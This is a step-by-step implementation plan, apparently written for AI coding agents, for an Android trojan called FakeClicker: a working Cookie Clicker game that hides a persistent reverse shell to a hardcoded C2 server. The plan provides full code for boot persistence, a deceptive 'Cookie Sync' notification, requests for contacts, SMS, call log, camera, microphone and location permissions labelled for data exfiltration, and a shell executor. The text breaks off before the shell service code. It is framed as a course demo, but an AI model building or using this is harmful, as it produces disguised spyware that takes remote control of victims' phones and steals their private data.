# FakeClicker Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Android APK disguised as a Cookie Clicker game that runs a persistent TCP reverse shell in the background — for cybersecurity course demonstration.

**Architecture:** A foreground `Service` runs a reconnect loop (TCP dial every 10s to hardcoded C2_IP:C2_PORT). The UI is a functional Cookie Clicker (score, upgrades, animations). A `BroadcastReceiver` auto-starts the service on device boot. Shell command execution is isolated in `ShellExecutor` so it can be unit-tested on the JVM.

**Tech Stack:** Kotlin, Android SDK minSdk 21 / targetSdk 34, Gradle 8.x, JUnit 4

---

## File Map

| File | Purpose |
|------|---------|
| `fakeClicker/settings.gradle` | Project name |
| `fakeClicker/build.gradle` | Root Gradle config |
| `fakeClicker/app/build.gradle` | App module config, dependencies |
| `fakeClicker/gradle/wrapper/gradle-wrapper.properties` | Gradle 8.6 wrapper |
| `fakeClicker/app/src/main/AndroidManifest.xml` | All permissions + components |
| `fakeClicker/app/src/main/res/values/colors.xml` | Dark cookie theme colors |
| `fakeClicker/app/src/main/res/values/strings.xml` | App strings |
| `fakeClicker/app/src/main/res/values/themes.xml` | Dark cookie theme |
| `fakeClicker/app/src/main/res/drawable/ic_cookie.xml` | Cookie vector drawable |
| `fakeClicker/app/src/main/res/anim/cookie_tap.xml` | Tap scale animation |
| `fakeClicker/app/src/main/res/layout/activity_main.xml` | Cookie Clicker UI layout |
| `fakeClicker/app/src/main/java/tech/fakeclicker/ShellExecutor.kt` | Pure shell command runner (testable) |
| `fakeClicker/app/src/main/java/tech/fakeclicker/CookieScore.kt` | Pure score/upgrade logic (testable) |
| `fakeClicker/app/src/main/java/tech/fakeclicker/PermissionHelper.kt` | Runtime permission requests |
| `fakeClicker/app/src/main/java/tech/fakeclicker/MainActivity.kt` | UI, score, animations, service start |
| `fakeClicker/app/src/main/java/tech/fakeclicker/ReverseShellService.kt` | TCP reverse shell foreground service |
| `fakeClicker/app/src/main/java/tech/fakeclicker/BootReceiver.kt` | Boot persistence receiver |
| `fakeClicker/app/src/test/java/tech/fakeclicker/CookieScoreTest.kt` | Unit tests for score logic |
| `fakeClicker/app/src/test/java/tech/fakeclicker/ShellExecutorTest.kt` | Unit tests for shell executor |

---

## Pre-requisite

**Before Task 1:** Install Android Studio (Hedgehog or newer). During Task 1 we use Android Studio to scaffold the project so the Gradle wrapper binaries (`gradlew`, `gradlew.bat`) are generated automatically. All subsequent file edits replace or add to that scaffold.

---

## Task 1: Project Scaffold

**Files:**
- Create: `fakeClicker/` (via Android Studio)
- Modify: `fakeClicker/settings.gradle`
- Modify: `fakeClicker/build.gradle`
- Modify: `fakeClicker/app/build.gradle`
- Create: `fakeClicker/gradle/wrapper/gradle-wrapper.properties`

- [ ] **Step 1: Scaffold via Android Studio**

  Open Android Studio → New Project → **Empty Views Activity**
  - Name: `Cookie Clicker`
  - Package: `tech.fakeclicker`
  - Save location: `/home/mechanosec/PetProjects/MySecurity/fakeClicker`
  - Language: Kotlin
  - Minimum SDK: API 21

  Let Android Studio sync Gradle. This generates `gradlew`, `gradlew.bat`, and the wrapper jars.

- [ ] **Step 2: Replace settings.gradle**

  `fakeClicker/settings.gradle`:
  ```groovy
  pluginManagement {
      repositories {
          google()
          mavenCentral()
          gradlePluginPortal()
      }
  }
  dependencyResolutionManagement {
      repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
      repositories {
          google()
          mavenCentral()
      }
  }
  rootProject.name = "Cookie Clicker"
  include ':app'
  ```

- [ ] **Step 3: Replace root build.gradle**

  `fakeClicker/build.gradle`:
  ```groovy
  plugins {
      id 'com.android.application' version '8.3.0' apply false
      id 'org.jetbrains.kotlin.android' version '1.9.22' apply false
  }
  ```

- [ ] **Step 4: Replace app/build.gradle**

  `fakeClicker/app/build.gradle`:
  ```groovy
  plugins {
      id 'com.android.application'
      id 'org.jetbrains.kotlin.android'
  }

  android {
      namespace 'tech.fakeclicker'
      compileSdk 34

      defaultConfig {
          applicationId "tech.fakeclicker"
          minSdk 21
          targetSdk 34
          versionCode 1
          versionName "1.0"
          testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
      }

      buildTypes {
          release {
              minifyEnabled false
          }
      }
      compileOptions {
          sourceCompatibility JavaVersion.VERSION_1_8
          targetCompatibility JavaVersion.VERSION_1_8
      }
      kotlinOptions {
          jvmTarget = '1.8'
      }
  }

  dependencies {
      implementation 'androidx.core:core-ktx:1.12.0'
      implementation 'androidx.appcompat:appcompat:1.6.1'
      implementation 'com.google.android.material:material:1.11.0'
      implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
      testImplementation 'junit:junit:4.13.2'
  }
  ```

- [ ] **Step 5: Sync Gradle**

  In Android Studio: **File → Sync Project with Gradle Files**
  Expected: BUILD SUCCESSFUL in the bottom panel, no red errors.

- [ ] **Step 6: Commit**

  ```bash
  cd /home/mechanosec/PetProjects/MySecurity
  git add fakeClicker/
  git commit -m "feat: scaffold FakeClicker Android project"
  ```

---

## Task 2: Resources & Theme

**Files:**
- Create: `fakeClicker/app/src/main/res/values/colors.xml`
- Create: `fakeClicker/app/src/main/res/values/strings.xml`
- Create: `fakeClicker/app/src/main/res/values/themes.xml`
- Create: `fakeClicker/app/src/main/res/drawable/ic_cookie.xml`
- Create: `fakeClicker/app/src/main/res/anim/cookie_tap.xml`

- [ ] **Step 1: colors.xml**

  `fakeClicker/app/src/main/res/values/colors.xml`:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <resources>
      <color name="bg_dark">#1a0a00</color>
      <color name="bg_panel">#2b1500</color>
      <color name="gold">#f5a623</color>
      <color name="gold_dim">#a06800</color>
      <color name="white">#FFFFFF</color>
      <color name="text_dim">#cccccc</color>
      <color name="upgrade_bg">#3d1f00</color>
      <color name="upgrade_disabled">#1f1000</color>
      <color name="cookie_brown">#C68642</color>
  </resources>
  ```

- [ ] **Step 2: strings.xml**

  `fakeClicker/app/src/main/res/values/strings.xml`:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <resources>
      <string name="app_name">Cookie Clicker</string>
      <string name="cookies_label">cookies</string>
      <string name="per_second_label">per second</string>
      <string name="upgrades_title">UPGRADES</string>
      <string name="notification_channel_id">cookie_sync</string>
      <string name="notification_channel_name">Cookie Sync</string>
      <string name="notification_title">Cookie Clicker</string>
      <string name="notification_text">Syncing cookie data…</string>
  </resources>
  ```

- [ ] **Step 3: themes.xml** — replace the generated one

  `fakeClicker/app/src/main/res/values/themes.xml`:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <resources>
      <style name="Theme.CookieClicker" parent="Theme.MaterialComponents.DayNight.NoActionBar">
          <item name="colorPrimary">@color/gold</item>
          <item name="colorPrimaryVariant">@color/gold_dim</item>
          <item name="colorOnPrimary">@color/bg_dark</item>
          <item name="android:windowBackground">@color/bg_dark</item>
          <item name="android:statusBarColor">@color/bg_dark</item>
          <item name="android:navigationBarColor">@color/bg_dark</item>
      </style>
  </resources>
  ```

- [ ] **Step 4: ic_cookie.xml** — vector cookie drawable

  Create dir `fakeClicker/app/src/main/res/drawable/` if it doesn't exist.

  `fakeClicker/app/src/main/res/drawable/ic_cookie.xml`:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <vector xmlns:android="http://schemas.android.com/apk/res/android"
      android:width="160dp"
      android:height="160dp"
      android:viewportWidth="100"
      android:viewportHeight="100">
      <path android:fillColor="#C68642"
          android:pathData="M50,4 C74,4 96,24 96,50 C96,76 74,96 50,96 C26,96 4,76 4,50 C4,24 26,4 50,4Z"/>
      <path android:fillColor="#A0522D"
          android:pathData="M50,8 C72,8 92,26 92,50 C92,74 72,92 50,92 C28,92 8,74 8,50 C8,26 28,8 50,8Z"
          android:strokeColor="#8B4513" android:strokeWidth="1"/>
      <path android:fillColor="#5C3317"
          android:pathData="M33,28 C36,28 38,30 38,33 C38,36 36,38 33,38 C30,38 28,36 28,33 C28,30 30,28 33,28Z"/>
      <path android:fillColor="#5C3317"
          android:pathData="M62,22 C65,22 67,24 67,27 C67,30 65,32 62,32 C59,32 57,30 57,27 C57,24 59,22 62,22Z"/>
      <path android:fillColor="#5C3317"
          android:pathData="M50,48 C53,48 55,50 55,53 C55,56 53,58 50,58 C47,58 45,56 45,53 C45,50 47,48 50,48Z"/>
      <path android:fillColor="#5C3317"
          android:pathData="M28,54 C31,54 33,56 33,59 C33,62 31,64 28,64 C25,64 23,62 23,59 C23,56 25,54 28,54Z"/>
      <path android:fillColor="#5C3317"
          android:pathData="M68,52 C71,52 73,54 73,57 C73,60 71,62 68,62 C65,62 63,60 63,57 C63,54 65,52 68,52Z"/>
      <path android:fillColor="#5C3317"
          android:pathData="M42,70 C45,70 47,72 47,75 C47,78 45,80 42,80 C39,80 37,78 37,75 C37,72 39,70 42,70Z"/>
  </vector>
  ```

- [ ] **Step 5: cookie_tap.xml** — scale animation on tap

  Create dir `fakeClicker/app/src/main/res/anim/`.

  `fakeClicker/app/src/main/res/anim/cookie_tap.xml`:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <set xmlns:android="http://schemas.android.com/apk/res/android"
      android:interpolator="@android:anim/decelerate_interpolator">
      <scale
          android:duration="80"
          android:fromXScale="0.88"
          android:fromYScale="0.88"
          android:pivotX="50%"
          android:pivotY="50%"
          android:toXScale="1.0"
          android:toYScale="1.0"/>
  </set>
  ```

- [ ] **Step 6: Commit**

  ```bash
  git add fakeClicker/app/src/main/res/
  git commit -m "feat: add cookie clicker resources and dark theme"
  ```

---

## Task 3: AndroidManifest.xml

**Files:**
- Modify: `fakeClicker/app/src/main/AndroidManifest.xml`

- [ ] **Step 1: Replace manifest**

  `fakeClicker/app/src/main/AndroidManifest.xml`:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <manifest xmlns:android="http://schemas.android.com/apk/res/android">

      <!-- Network (reverse shell) -->
      <uses-permission android:name="android.permission.INTERNET"/>

      <!-- Persistence -->
      <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
      <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
      <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>

      <!-- Data exfiltration demo -->
      <uses-permission android:name="android.permission.READ_CONTACTS"/>
      <uses-permission android:name="android.permission.READ_SMS"/>
      <uses-permission android:name="android.permission.READ_CALL_LOG"/>
      <uses-permission android:name="android.permission.RECORD_AUDIO"/>
      <uses-permission android:name="android.permission.CAMERA"/>

      <!-- Location -->
      <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
      <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
      <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>

      <!-- Storage -->
      <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
          android:maxSdkVersion="32"/>
      <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
      <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
      <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>

      <application
          android:allowBackup="true"
          android:icon="@mipmap/ic_launcher"
          android:label="@string/app_name"
          android:roundIcon="@mipmap/ic_launcher_round"
          android:supportsRtl="true"
          android:theme="@style/Theme.CookieClicker">

          <activity
              android:name=".MainActivity"
              android:exported="true">
              <intent-filter>
                  <action android:name="android.intent.action.MAIN"/>
                  <category android:name="android.intent.category.LAUNCHER"/>
              </intent-filter>
          </activity>

          <service
              android:name=".ReverseShellService"
              android:exported="false"
              android:foregroundServiceType="dataSync"/>

          <receiver
              android:name=".BootReceiver"
              android:exported="true">
              <intent-filter>
                  <action android:name="android.intent.action.BOOT_COMPLETED"/>
                  <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
              </intent-filter>
          </receiver>

      </application>
  </manifest>
  ```

- [ ] **Step 2: Commit**

  ```bash
  git add fakeClicker/app/src/main/AndroidManifest.xml
  git commit -m "feat: manifest with full permission set and component declarations"
  ```

---

## Task 4: CookieScore Logic + Unit Tests (TDD)

**Files:**
- Create: `fakeClicker/app/src/test/java/tech/fakeclicker/CookieScoreTest.kt`
- Create: `fakeClicker/app/src/main/java/tech/fakeclicker/CookieScore.kt`

- [ ] **Step 1: Write failing tests**

  `fakeClicker/app/src/test/java/tech/fakeclicker/CookieScoreTest.kt`:
  ```kotlin
  package tech.fakeclicker

  import org.junit.Assert.*
  import org.junit.Test

  class CookieScoreTest {

      @Test
      fun `tap increments score by 1`() {
          val score = CookieScore()
          score.tap()
          assertEquals(1L, score.cookies)
      }

      @Test
      fun `multiple taps accumulate`() {
          val score = CookieScore()
          repeat(5) { score.tap() }
          assertEquals(5L, score.cookies)
      }

      @Test
      fun `can afford upgrade when score equals cost`() {
          val score = CookieScore()
          repeat(10) { score.tap() }
          assertTrue(score.canAfford(10L))
      }

      @Test
      fun `cannot afford upgrade when score is less than cost`() {
          val score = CookieScore()
          repeat(9) { score.tap() }
          assertFalse(score.canAfford(10L))
      }

      @Test
      fun `buying upgrade deducts cost and adds cps`() {
          val score = CookieScore()
          repeat(100) { score.tap() }
          score.buyUpgrade(cost = 10L, cps = 5L)
          assertEquals(90L, score.cookies)
          assertEquals(5L, score.cookiesPerSecond)
      }

      @Test
      fun `multiple upgrades accumulate cps`() {
          val score = CookieScore()
          repeat(1000) { score.tap() }
          score.buyUpgrade(cost = 10L, cps = 1L)
          score.buyUpgrade(cost = 100L, cps = 5L)
          assertEquals(6L, score.cookiesPerSecond)
      }

      @Test
      fun `tick adds cookiesPerSecond to total`() {
          val score = CookieScore()
          repeat(1000) { score.tap() }
          score.buyUpgrade(cost = 10L, cps = 3L)
          score.tick()
          assertEquals(993L, score.cookies)
      }
  }
  ```

- [ ] **Step 2: Run tests — verify they FAIL**

  In Android Studio: right-click `CookieScoreTest.kt` → Run
  Expected: compilation error — `CookieScore` not found.

- [ ] **Step 3: Implement CookieScore**

  `fakeClicker/app/src/main/java/tech/fakeclicker/CookieScore.kt`:
  ```kotlin
  package tech.fakeclicker

  class CookieScore {
      var cookies: Long = 0L
          private set
      var cookiesPerSecond: Long = 0L
          private set

      fun tap() { cookies++ }

      fun canAfford(cost: Long): Boolean = cookies >= cost

      fun buyUpgrade(cost: Long, cps: Long) {
          cookies -= cost
          cookiesPerSecond += cps
      }

      fun tick() { cookies += cookiesPerSecond }
  }
  ```

- [ ] **Step 4: Run tests — verify they PASS**

  Right-click `CookieScoreTest.kt` → Run
  Expected: all 7 tests GREEN.

- [ ] **Step 5: Commit**

  ```bash
  git add fakeClicker/app/src/main/java/tech/fakeclicker/CookieScore.kt \
          fakeClicker/app/src/test/java/tech/fakeclicker/CookieScoreTest.kt
  git commit -m "feat: cookie score logic with unit tests"
  ```

---

## Task 5: ShellExecutor + Unit Tests (TDD)

**Files:**
- Create: `fakeClicker/app/src/test/java/tech/fakeclicker/ShellExecutorTest.kt`
- Create: `fakeClicker/app/src/main/java/tech/fakeclicker/ShellExecutor.kt`

- [ ] **Step 1: Write failing tests**

  `fakeClicker/app/src/test/java/tech/fakeclicker/ShellExecutorTest.kt`:
  ```kotlin
  package tech.fakeclicker

  import org.junit.Assert.*
  import org.junit.Test

  class ShellExecutorTest {

      @Test
      fun `run echo returns output`() {
          val result = ShellExecutor.run("echo hello")
          assertEquals("hello", result.trim())
      }

      @Test
      fun `run pwd returns non-empty path`() {
          val result = ShellExecutor.run("pwd")
          assertTrue(result.trim().startsWith("/"))
      }

      @Test
      fun `run invalid command returns error text`() {
          val result = ShellExecutor.run("notarealcommand_xyz")
          assertTrue(result.isNotEmpty())
      }

      @Test
      fun `run empty string returns empty`() {
          val result = ShellExecutor.run("")
          assertEquals("", result.trim())
      }
  }
  ```

- [ ] **Step 2: Run tests — verify they FAIL**

  Right-click `ShellExecutorTest.kt` → Run
  Expected: compilation error — `ShellExecutor` not found.

- [ ] **Step 3: Implement ShellExecutor**

  `fakeClicker/app/src/main/java/tech/fakeclicker/ShellExecutor.kt`:
  ```kotlin
  package tech.fakeclicker

  object ShellExecutor {
      fun run(cmd: String): String {
          if (cmd.isBlank()) return ""
          return try {
              val proc = ProcessBuilder("sh", "-c", cmd)
                  .redirectErrorStream(true)
                  .start()
              val output = proc.inputStream.bufferedReader().readText()
              proc.waitFor()
              output
          } catch (e: Exception) {
              "error: ${e.message}\n"
          }
      }
  }
  ```

  > Note: On device, `sh` resolves to `/system/bin/sh`. In JVM unit tests, it resolves to the host shell — both work.

- [ ] **Step 4: Run tests — verify they PASS**

  Right-click `ShellExecutorTest.kt` → Run
  Expected: all 4 tests GREEN.

- [ ] **Step 5: Commit**

  ```bash
  git add fakeClicker/app/src/main/java/tech/fakeclicker/ShellExecutor.kt \
          fakeClicker/app/src/test/java/tech/fakeclicker/ShellExecutorTest.kt
  git commit -m "feat: shell executor with unit tests"
  ```

---

## Task 6: PermissionHelper

**Files:**
- Create: `fakeClicker/app/src/main/java/tech/fakeclicker/PermissionHelper.kt`

- [ ] **Step 1: Implement PermissionHelper**

  `fakeClicker/app/src/main/java/tech/fakeclicker/PermissionHelper.kt`:
  ```kotlin
  package tech.fakeclicker

  import android.Manifest
  import android.app.Activity
  import android.content.pm.PackageManager
  import android.os.Build
  import androidx.core.app.ActivityCompat
  import androidx.core.content.ContextCompat

  object PermissionHelper {

      const val REQUEST_CODE = 42

      private val BASE_PERMISSIONS = arrayOf(
          Manifest.permission.READ_CONTACTS,
          Manifest.permission.READ_SMS,
          Manifest.permission.READ_CALL_LOG,
          Manifest.permission.RECORD_AUDIO,
          Manifest.permission.CAMERA,
          Manifest.permission.ACCESS_FINE_LOCATION,
          Manifest.permission.ACCESS_COARSE_LOCATION,
      )

      private val STORAGE_LEGACY = arrayOf(
          Manifest.permission.READ_EXTERNAL_STORAGE,
      )

      private val STORAGE_API33 = if (Build.VERSION.SDK_INT >= 33) arrayOf(
          Manifest.permission.READ_MEDIA_IMAGES,
          Manifest.permission.READ_MEDIA_VIDEO,
          Manifest.permission.READ_MEDIA_AUDIO,
      ) else emptyArray()

      private val BACKGROUND_LOCATION = if (Build.VERSION.SDK_INT >= 29) arrayOf(
          Manifest.permission.ACCESS_BACKGROUND_LOCATION,
      ) else emptyArray()

      fun requestAll(activity: Activity) {
          val storage = if (Build.VERSION.SDK_INT >= 33) STORAGE_API33 else STORAGE_LEGACY
          val all = BASE_PERMISSIONS + storage

          val missing = all.filter {
              ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
          }

          if (missing.isNotEmpty()) {
              ActivityCompat.requestPermissions(activity, missing.toTypedArray(), REQUEST_CODE)
          } else {
              requestBackgroundLocation(activity)
          }
      }

      fun requestBackgroundLocation(activity: Activity) {
          if (Build.VERSION.SDK_INT >= 29 && BACKGROUND_LOCATION.isNotEmpty()) {
              val missing = BACKGROUND_LOCATION.filter {
                  ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
              }
              if (missing.isNotEmpty()) {
                  ActivityCompat.requestPermissions(activity, missing.toTypedArray(), REQUEST_CODE + 1)
              }
          }
      }
  }
  ```

- [ ] **Step 2: Commit**

  ```bash
  git add fakeClicker/app/src/main/java/tech/fakeclicker/PermissionHelper.kt
  git commit -m "feat: permission helper for all dangerous permissions"
  ```

---

## Task 7: UI Layout

**Files:**
- Modify: `fakeClicker/app/src/main/res/layout/activity_main.xml`

- [ ] **Step 1: Replace activity_main.xml**

  `fakeClicker/app/src/main/res/layout/activity_main.xml`:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <androidx.constraintlayout.widget.ConstraintLayout
      xmlns:android="http://schemas.android.com/apk/res/android"
      xmlns:app="http://schemas.android.com/apk/res-auto"
      android:id="@+id/rootLayout"
      android:layout_width="match_parent"
      android:layout_height="match_parent"
      android:background="@color/bg_dark">

      <!-- App title bar -->
      <TextView
          android:id="@+id/tvTitle"
          android:layout_width="match_parent"
          android:layout_height="wrap_content"
          android:background="@color/bg_panel"
          android:paddingVertical="12dp"
          android:text="@string/app_name"
          android:textColor="@color/gold"
          android:textSize="20sp"
          android:textStyle="bold"
          android:gravity="center"
          app:layout_constraintTop_toTopOf="parent"/>

      <!-- Cookie counter -->
      <TextView
          android:id="@+id/tvCookieCount"
          android:layout_width="wrap_content"
          android:layout_height="wrap_content"
          android:text="0 cookies"
          android:textColor="@color/gold"
          android:textSize="28sp"
          android:textStyle="bold"
          app:layout_constraintTop_toBottomOf="@id/tvTitle"
          app:layout_constraintStart_toStartOf="parent"
          app:layout_constraintEnd_toEndOf="parent"
          android:layout_marginTop="20dp"/>

      <!-- CPS counter -->
      <TextView
          android:id="@+id/tvCps"
          android:layout_width="wrap_content"
          android:layout_height="wrap_content"
          android:text="0 per second"
          android:textColor="@color/text_dim"
          android:textSize="14sp"
          app:layout_constraintTop_toBottomOf="@id/tvCookieCount"
          app:layout_constraintStart_toStartOf="parent"
          app:layout_constraintEnd_toEndOf="parent"
          android:layout_marginTop="4dp"/>

      <!-- Big cookie button -->
      <ImageButton
          android:id="@+id/btnCookie"
          android:layout_width="180dp"
          android:layout_height="180dp"
          android:src="@drawable/ic_cookie"
          android:background="@null"
          android:contentDescription="Cookie"
          android:scaleType="fitCenter"
          app:layout_constraintTop_toBottomOf="@id/tvCps"
          app:layout_constraintBottom_toTopOf="@id/tvUpgradesLabel"
          app:layout_constraintStart_toStartOf="parent"
          app:layout_constraintEnd_toEndOf="parent"/>

      <!-- Upgrades label -->
      <TextView
          android:id="@+id/tvUpgradesLabel"
          android:layout_width="match_parent"
          android:layout_height="wrap_content"
          android:text="@string/upgrades_title"
          android:textColor="@color/gold"
          android:textSize="12sp"
          android:textStyle="bold"
          android:paddingHorizontal="16dp"
          android:paddingTop="8dp"
          app:layout_constraintBottom_toTopOf="@id/scrollUpgrades"/>

      <!-- Upgrades horizontal scroll -->
      <HorizontalScrollView
          android:id="@+id/scrollUpgrades"
          android:layout_width="match_parent"
          android:layout_height="wrap_content"
          android:background="@color/bg_panel"
          android:paddingVertical="8dp"
          app:layout_constraintBottom_toBottomOf="parent">

          <LinearLayout
              android:id="@+id/upgradesRow"
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:orientation="horizontal"
              android:paddingHorizontal="8dp"/>
      </HorizontalScrollView>

  </androidx.constraintlayout.widget.ConstraintLayout>
  ```

- [ ] **Step 2: Commit**

  ```bash
  git add fakeClicker/app/src/main/res/layout/activity_main.xml
  git commit -m "feat: cookie clicker UI layout"
  ```

---

## Task 8: MainActivity

**Files:**
- Modify: `fakeClicker/app/src/main/java/tech/fakeclicker/MainActivity.kt`

- [ ] **Step 1: Implement MainActivity**

  `fakeClicker/app/src/main/java/tech/fakeclicker/MainActivity.kt`:
  ```kotlin
  package tech.fakeclicker

  import android.content.Intent
  import android.graphics.Color
  import android.os.Build
  import android.os.Bundle
  import android.os.Handler
  import android.os.Looper
  import android.view.animation.AnimationUtils
  import android.widget.*
  import androidx.appcompat.app.AppCompatActivity
  import tech.fakeclicker.databinding.ActivityMainBinding

  private data class Upgrade(
      val id: String,
      val label: String,
      val emoji: String,
      val cost: Long,
      val cps: Long,
  )

  private val UPGRADES = listOf(
      Upgrade("cursor",  "Cursor",  "👆", 10L,    1L),
      Upgrade("grandma", "Grandma", "👵", 100L,   5L),
      Upgrade("farm",    "Farm",    "🌾", 500L,   10L),
      Upgrade("mine",    "Mine",    "⛏️", 2_000L, 40L),
      Upgrade("factory", "Factory", "🏭", 8_000L, 100L),
  )

  class MainActivity : AppCompatActivity() {

      private lateinit var binding: ActivityMainBinding
      private val score = CookieScore()
      private val bought = mutableSetOf<String>()
      private val tickHandler = Handler(Looper.getMainLooper())
      private val uiHandler = Handler(Looper.getMainLooper())

      override fun onCreate(savedInstanceState: Bundle?) {
          super.onCreate(savedInstanceState)
          binding = ActivityMainBinding.inflate(layoutInflater)
          setContentView(binding.root)

          restoreState()
          setupCookieButton()
          setupUpgrades()
          startTickLoop()
          startShellService()
          PermissionHelper.requestAll(this)
      }

      override fun onRequestPermissionsResult(
          requestCode: Int, permissions: Array<String>, grantResults: IntArray
      ) {
          super.onRequestPermissionsResult(requestCode, permissions, grantResults)
          if (requestCode == PermissionHelper.REQUEST_CODE) {
              PermissionHelper.requestBackgroundLocation(this)
          }
      }

      override fun onPause() {
          super.onPause()
          saveState()
      }

      override fun onDestroy() {
          super.onDestroy()
          tickHandler.removeCallbacksAndMessages(null)
          uiHandler.removeCallbacksAndMessages(null)
      }

      private fun setupCookieButton() {
          val tapAnim = AnimationUtils.loadAnimation(this, R.anim.cookie_tap)
          binding.btnCookie.setOnClickListener { view ->
              score.tap()
              view.startAnimation(tapAnim)
              spawnFloatingPlus()
              updateCounterUI()
              updateUpgradeStates()
          }
      }

      private fun setupUpgrades() {
          UPGRADES.forEach { upgrade ->
              val card = buildUpgradeCard(upgrade)
              binding.upgradesRow.addView(card)
          }
      }

      private fun buildUpgradeCard(upgrade: Upgrade): LinearLayout {
          val card = LinearLayout(this).apply {
              orientation = LinearLayout.VERTICAL
              setPadding(16, 12, 16, 12)
              setBackgroundColor(
                  if (score.canAfford(upgrade.cost) && upgrade.id !in bought)
                      Color.parseColor("#3d1f00")
                  else
                      Color.parseColor("#1f1000")
              )
              tag = upgrade.id
              layoutParams = LinearLayout.LayoutParams(160, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
                  setMargins(8, 0, 8, 0)
              }
          }

          val emoji = TextView(this).apply {
              text = upgrade.emoji
              textSize = 28f
              gravity = android.view.Gravity.CENTER
              layoutParams = LinearLayout.LayoutParams(
                  LinearLayout.LayoutParams.MATCH_PARENT,
                  LinearLayout.LayoutParams.WRAP_CONTENT
              )
          }

          val name = TextView(this).apply {
              text = upgrade.label
              setTextColor(Color.WHITE)
              textSize = 11f
              gravity = android.view.Gravity.CENTER
          }

          val cost = TextView(this).apply {
              text = formatNumber(upgrade.cost)
              setTextColor(Color.parseColor("#f5a623"))
              textSize = 11f
              gravity = android.view.Gravity.CENTER
          }

          val cps = TextView(this).apply {
              text = "+${upgrade.cps}/s"
              setTextColor(Color.parseColor("#cccccc"))
              textSize = 10f
              gravity = android.view.Gravity.CENTER
          }

          card.addView(emoji)
          card.addView(name)
          card.addView(cost)
          card.addView(cps)

          if (upgrade.id !in bought) {
              card.setOnClickListener {
                  if (score.canAfford(upgrade.cost)) {
                      score.buyUpgrade(upgrade.cost, upgrade.cps)
                      bought.add(upgrade.id)
                      card.isClickable = false
                      card.setBackgroundColor(Color.parseColor("#0d0500"))
                      emoji.alpha = 0.4f
                      updateCounterUI()
                      updateUpgradeStates()
                  }
              }
          } else {
              card.setBackgroundColor(Color.parseColor("#0d0500"))
              emoji.alpha = 0.4f
          }

          return card
      }

      private fun updateUpgradeStates() {
          for (i in 0 until binding.upgradesRow.childCount) {
              val card = binding.upgradesRow.getChildAt(i) as? LinearLayout ?: continue
              val id = card.tag as? String ?: continue
              if (id in bought) continue
              val upgrade = UPGRADES.find { it.id == id } ?: continue
              card.setBackgroundColor(
                  if (score.canAfford(upgrade.cost)) Color.parseColor("#3d1f00")
                  else Color.parseColor("#1f1000")
              )
          }
      }

      private fun startTickLoop() {
          tickHandler.post(object : Runnable {
              override fun run() {
                  score.tick()
                  updateCounterUI()
                  tickHandler.postDelayed(this, 1_000)
              }
          })
      }

      private fun updateCounterUI() {
          binding.tvCookieCount.text = "${formatNumber(score.cookies)} cookies"
          binding.tvCps.text = "${score.cookiesPerSecond} per second"
      }

      private fun spawnFloatingPlus() {
          val tv = TextView(this).apply {
              text = "+1"
              setTextColor(Color.parseColor("#f5a623"))
              textSize = 18f
              alpha = 1f
          }
          val cookie = binding.btnCookie
          val x = cookie.x + cookie.width / 2f - 20f
          val y = cookie.y
          tv.x = x
          tv.y = y
          binding.rootLayout.addView(tv)

          tv.animate()
              .translationYBy(-120f)
              .alpha(0f)
              .setDuration(700)
              .withEndAction { binding.rootLayout.removeView(tv) }
              .start()
      }

      private fun formatNumber(n: Long): String = when {
          n >= 1_000_000_000 -> "%.1fB".format(n / 1_000_000_000.0)
          n >= 1_000_000     -> "%.1fM".format(n / 1_000_000.0)
          n >= 1_000         -> "%.1fK".format(n / 1_000.0)
          else               -> n.toString()
      }

      private fun startShellService() {
          val intent = Intent(this, ReverseShellService::class.java)
          if (Build.VERSION.SDK_INT >= 26) {
              startForegroundService(intent)
          } else {
              startService(intent)
          }
      }

      private fun saveState() {
          val prefs = getSharedPreferences("cc", MODE_PRIVATE).edit()
          prefs.putLong("cookies", score.cookies)
          prefs.putStringSet("bought", bought)
          prefs.apply()
      }

      private fun restoreState() {
          val prefs = getSharedPreferences("cc", MODE_PRIVATE)
          val savedCookies = prefs.getLong("cookies", 0L)
          val savedBought = prefs.getStringSet("bought", emptySet()) ?: emptySet()
          repeat(savedCookies.toInt().coerceAtMost(Int.MAX_VALUE)) { score.tap() }
          savedBought.forEach { id ->
              val upgrade = UPGRADES.find { it.id == id }
              if (upgrade != null) {
                  bought.add(id)
                  score.buyUpgrade(0L, upgrade.cps)
              }
          }
      }
  }
  ```

  > Note: `ActivityMainBinding` is auto-generated from the layout. Enable ViewBinding in `app/build.gradle` by adding `buildFeatures { viewBinding true }` inside the `android {}` block.

- [ ] **Step 2: Enable ViewBinding in app/build.gradle**

  In `fakeClicker/app/build.gradle`, inside the `android {}` block, add:
  ```groovy
  buildFeatures {
      viewBinding true
  }
  ```

- [ ] **Step 3: Sync Gradle and verify build**

  Android Studio → Sync Now.
  Then Build → Make Project.
  Expected: BUILD SUCCESSFUL, no red squiggles in MainActivity.kt.

- [ ] **Step 4: Commit**

  ```bash
